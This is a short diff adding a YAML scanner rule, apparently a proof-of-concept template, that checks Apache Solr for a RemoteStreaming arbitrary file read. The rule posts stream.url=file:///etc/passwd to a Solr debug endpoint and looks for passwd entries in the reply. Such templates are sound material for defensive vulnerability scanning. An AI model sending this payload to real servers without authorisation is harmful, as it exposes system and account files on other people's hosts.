@@ -1,0 +1,13 @@
+name: Apache-Solr-RemoteStreaming-Anyfileread
+rules:
+  r0:
+    request:
+      method: POST
+      path: /solr/demo/debug/dump?param=ContentStreams
+      body: |
+        stream.url=file:///etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/VMZfbUClU8I72pAzzitAOA
